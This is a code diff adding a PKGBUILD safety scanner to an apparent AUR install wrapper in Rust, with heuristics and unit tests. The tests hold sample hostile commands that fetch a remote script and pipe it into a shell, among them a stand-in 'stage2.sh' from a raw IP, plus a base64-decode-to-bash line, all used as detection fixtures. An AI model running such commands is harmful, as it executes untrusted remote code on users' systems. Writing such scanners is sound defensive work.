@@ -1119,6 +1119,312 @@ fn print_system_info() {
     }
 }
 
+// ── AUR PKGBUILD safety scanner ─────────────────────────────────────────────
+//
+// Runs automatically before every AUR install (`aura -A ...`). Fetches each
+// package's raw PKGBUILD from the AUR cgit mirror (no `git clone`, just the
+// plain file) and greps it for a handful of red-flag patterns commonly seen
+// in malicious/compromised PKGBUILDs. This is *not* a substitute for reading
+// the PKGBUILD yourself — it only catches crude, textbook-obvious tricks —
+// but it's a cheap tripwire against copy-pasted or automated garbage.
+//
+// On any hit, the install is blocked and the user must type an explicit "y"
+// to proceed anyway. Anything else (including empty input / EOF) aborts.
+
+const CURL_BIN: &str = "/usr/bin/curl";
+
+/// Download the raw PKGBUILD for `pkg` from the AUR cgit web UI.
+/// Returns None on any network/parse failure (missing package, no
+/// connectivity, AUR down, etc.) — callers should *not* treat that as a
+/// clean scan, just as "nothing to check".
+fn fetch_aur_pkgbuild(pkg: &str) -> Option<String> {
+    let url = format!(
+        "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h={}",
+        pkg
+    );
+    let output = Command::new(CURL_BIN)
+        .args(["-sfL", "--max-time", "10", &url])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::null())
+        .output()
+        .ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    let text = String::from_utf8_lossy(&output.stdout).to_string();
+    if text.trim().is_empty() {
+        None
+    } else {
+        Some(text)
+    }
+}
+
+/// `curl ... | sh` / `wget ... | bash` / `... | source` style remote-code-exec
+/// pipelines. Deliberately loose (matches curl/wget followed eventually by a
+/// pipe into a shell) since attackers vary whitespace and flags constantly.
+fn is_curl_pipe_shell(source: &str) -> bool {
+    for line in source.lines() {
+        let l = line.trim();
+        if l.starts_with('#') {
+            continue;
+        }
+        let lower = l.to_lowercase();
+        let has_fetcher = lower.contains("curl ") || lower.contains("curl\t")
+            || lower.contains("wget ") || lower.contains("wget\t");
+        if !has_fetcher || !lower.contains('|') {
+            continue;
+        }
+        let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("");
+        if ["sh", "bash", "zsh", "source", "."].iter().any(|shell| {
+            after_pipe.split_whitespace().next() == Some(shell)
+        }) {
+            return true;
+        }
+    }
+    false
+}
+
+/// `base64 -d` / `base64 --decode` — near-universal marker of obfuscated
+/// payloads stashed in a PKGBUILD (legit PKGBUILDs essentially never need
+/// this).
+fn is_base64_decode(source: &str) -> bool {
+    source.lines().any(|line| {
+        let l = line.trim();
+        if l.starts_with('#') {
+            return false;
+        }
+        let lower = l.to_lowercase();
+        lower.contains("base64 -d") || lower.contains("base64 --decode")
+            || lower.contains("base64 -D")
+    })
+}
+
+/// `chmod 777` / `chmod -R 777` (and equivalent a+rwx) — overly permissive
+/// perms with no legitimate reason to appear in a build script.
+fn is_chmod_777(source: &str) -> bool {
+    source.lines().any(|line| {
+        let l = line.trim();
+        if l.starts_with('#') {
+            return false;
+        }
+        let lower = l.to_lowercase();
+        lower.contains("chmod") && (lower.contains("777") || lower.contains("a+rwx"))
+    })
+}
+
+/// A bare dotted-quad IPv4 literal anywhere in the file — legitimate
+/// PKGBUILDs fetch sources from named domains, not hardcoded IPs. Simple
+/// heuristic: 4 dot-separated 1-3 digit groups, each <= 255, not preceded/
+/// followed by another digit or dot (so it doesn't fire on version strings
+/// buried in longer numbers).
+///
+/// Known false positive: a 4-component dotted pkgver/version string where
+/// every component happens to be <= 255 (e.g. "1.2.3.4") is indistinguishable
+/// from an IP by pure pattern matching and will also flag. That's an
+/// acceptable trade-off here — this only produces a review prompt, not a
+/// hard failure — but worth knowing if a clean package suddenly needs "y".
+fn contains_raw_ipv4(source: &str) -> bool {
+    let bytes = source.as_bytes();
+    let is_boundary = |c: Option<u8>| !matches!(c, Some(b) if b.is_ascii_digit() || b == b'.');
+
+    let chars: Vec<char> = source.chars().collect();
+    let n = chars.len();
+    let mut i = 0;
+    while i < n {
+        if chars[i].is_ascii_digit() {
+            let start = i;
+            let mut j = i;
+            let mut octets = 0;
+            let mut ok = true;
+            loop {
+                let mut k = j;
+                while k < n && chars[k].is_ascii_digit() && k - j < 3 {
+                    k += 1;
+                }
+                if k == j {
+                    ok = false;
+                    break;
+                }
+                let octet: u32 = chars[j..k].iter().collect::<String>().parse().unwrap_or(999);
+                if octet > 255 {
+                    ok = false;
+                    break;
+                }
+                octets += 1;
+                j = k;
+                if octets == 4 {
+                    break;
+                }
+                if j < n && chars[j] == '.' {
+                    j += 1;
+                } else {
+                    ok = false;
+                    break;
+                }
+            }
+            if ok && octets == 4 {
+                let before_ok = is_boundary(bytes.get(start.wrapping_sub(1)).copied().filter(|_| start > 0));
+                let after_ok = is_boundary(chars.get(j).map(|c| *c as u8));
+                let before_ok = start == 0 || before_ok;
+                if before_ok && after_ok {
+                    return true;
+                }
+            }
+            i = start + 1;
+        } else {
+            i += 1;
+        }
+    }
+    false
+}
+
+/// Run all heuristics against one PKGBUILD, returning human-readable
+/// findings (empty vec = clean).
+fn scan_pkgbuild_source(source: &str) -> Vec<String> {
+    let mut findings = Vec::new();
+    if is_curl_pipe_shell(source) {
+        findings.push("downloads and pipes a remote script straight into a shell (curl/wget | sh)".to_string());
+    }
+    if is_base64_decode(source) {
+        findings.push("decodes a base64 blob (possible obfuscated payload)".to_string());
+    }
+    if is_chmod_777(source) {
+        findings.push("sets world-writable/executable permissions (chmod 777)".to_string());
+    }
+    if contains_raw_ipv4(source) {
+        findings.push("fetches from or references a hardcoded raw IP address instead of a domain".to_string());
+    }
+    findings
+}
+
+/// Fetch + scan the PKGBUILD for every package about to be installed from
+/// the AUR. If anything suspicious turns up in any of them, print the
+/// findings and block until the user types an explicit "y". Anything else
+/// aborts the whole install (exits the process), matching the "block and
+/// require explicit y" behavior the user confirmed.
+///
+/// Packages whose PKGBUILD couldn't be fetched (network hiccup, AUR down,
+/// name not found, split-package headers, etc.) are silently skipped rather
+/// than treated as a hit — this scanner only ever adds friction on actual
+/// findings, never on lookup failures.
+fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
+    let mut any_findings = false;
+    println!("{} Scanning AUR PKGBUILDs for suspicious patterns...", ">>>".green().bold());
+
+    for pkg in pkgs {
+        let source = match fetch_aur_pkgbuild(pkg) {
+            Some(s) => s,
+            None => continue,
+        };
+        let findings = scan_pkgbuild_source(&source);
+        if findings.is_empty() {
+            continue;
+        }
+        any_findings = true;
+        eprintln!();
+        eprintln!("{} {} {}", "!!!".red().bold(), "Suspicious PKGBUILD:".red().bold(), pkg.bold());
+        for f in &findings {
+            eprintln!("    - {}", f);
+        }
+    }
+
+    if !any_findings {
+        return;
+    }
+
+    eprintln!();
+    eprintln!(
+        "{} One or more AUR packages have PKGBUILDs matching known-suspicious \
+        patterns. Review them yourself before proceeding:",
+        ">>>".red().bold()
+    );
+    for pkg in pkgs {
+        eprintln!("    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}", pkg);
+    }
+    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
+    io::stderr().flush().ok();
+
+    let mut answer = String::new();
+    let confirmed = io::stdin().lock().read_line(&mut answer).is_ok()
+        && answer.trim().eq_ignore_ascii_case("y");
+
+    if !confirmed {
+        eprintln!("{} Aborted.", ">>>".red().bold());
+        std::process::exit(1);
+    }
+}
+
+#[cfg(test)]
+mod scanner_tests {
+    use super::*;
+
+    #[test]
+    fn curl_pipe_sh_detected() {
+        assert!(is_curl_pipe_shell("curl -sSL https://evil.example.com/x | sh"));
+        assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
+        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
+        assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
+    }
+
+    #[test]
+    fn base64_decode_detected() {
+        assert!(is_base64_decode("echo $PAYLOAD | base64 -d | bash"));
+        assert!(is_base64_decode("base64 --decode < blob.txt > out"));
+        assert!(!is_base64_decode("makepkg --version"));
+    }
+
+    #[test]
+    fn chmod_777_detected() {
+        assert!(is_chmod_777("chmod 777 \"$pkgdir/usr/bin/foo\""));
+        assert!(is_chmod_777("chmod -R 777 build/"));
+        assert!(!is_chmod_777("chmod 755 \"$pkgdir/usr/bin/foo\""));
+    }
+
+    #[test]
+    fn raw_ipv4_detected() {
+        assert!(contains_raw_ipv4("source=(\"http://185.220.101.5/payload.sh\")"));
+        assert!(contains_raw_ipv4("192.168.1.1"));
+        assert!(!contains_raw_ipv4("source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"));
+        assert!(!contains_raw_ipv4("no ip here at all"));
+        // Known false positive, documented on contains_raw_ipv4: a 4-part
+        // dotted version where every part is <= 255 reads as an IP too.
+        assert!(contains_raw_ipv4("pkgver=1.2.3.4"));
+    }
+
+    #[test]
+    fn clean_pkgbuild_has_no_findings() {
+        let src = r#"
+pkgname=foo
+pkgver=1.2.3
+pkgrel=1
+source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
+sha256sums=('abc123')
+build() {
+  cd "$pkgname-$pkgver"
+  make
+}
+package() {
+  cd "$pkgname-$pkgver"
+  make DESTDIR="$pkgdir" install
+}
+"#;
+        assert!(scan_pkgbuild_source(src).is_empty());
+    }
+
+    #[test]
+    fn malicious_pkgbuild_flagged() {
+        let src = r#"
+pkgname=evil
+build() {
+  curl -sSL http://185.220.101.5/stage2.sh | bash
+  chmod 777 /tmp/evil
+}
+"#;
+        let findings = scan_pkgbuild_source(src);
+        assert_eq!(findings.len(), 3);
+    }
+}
+
 fn main() {
 
     // If invoked as "portageq" (symlink), act as the shim
@@ -1507,6 +1813,7 @@ fn main() {
             print_emerge_plan(&pkg_infos);
             if cli.pretend { return; }
             print_emerge_emerging(&pkg_infos);
+            scan_aur_pkgbuilds_or_abort(&target_pkgs);
             let mut aur_args = vec!["-A"];
             aur_args.extend(&base_args);
             success = run_cmd(AURA_BIN, &aur_args, &target_pkgs);
@@ -1579,6 +1886,7 @@ fn main() {
                 print_emerge_plan(&pkg_infos);
                 if cli.pretend { return; }
                 print_emerge_emerging(&pkg_infos);
+                scan_aur_pkgbuilds_or_abort(&missing);
                 let mut aur_args = vec!["-A"];
                 aur_args.extend(&base_args);
                 success = run_cmd(AURA_BIN, &aur_args, &missing);
@@ -1606,6 +1914,7 @@ fn main() {
                     installed_infos.extend(official_infos);
                 }
 
+                scan_aur_pkgbuilds_or_abort(&missing);
                 let mut aur_args = vec!["-A"];
                 aur_args.extend(&base_args);
                 let aur_success = run_cmd(AURA_BIN, &aur_args, &missing);
